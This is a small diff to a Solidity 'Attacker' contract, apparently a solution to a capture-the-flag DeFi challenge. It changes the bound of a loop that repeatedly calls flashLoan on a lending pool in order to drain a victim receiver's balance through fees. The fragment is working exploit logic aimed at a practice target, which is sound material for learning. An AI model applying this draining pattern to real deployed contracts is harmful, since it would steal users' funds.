@@ -8,7 +8,7 @@ contract Attacker {
     using Address for address;
 
     function attack(NaiveReceiverLenderPool pool, address payable user) external {
-        for (uint256 i = 0; i < user.balance; i++) {
+        for (uint256 i = 0; i <= user.balance; i++) {
             pool.flashLoan(user, 0);
         }
     }
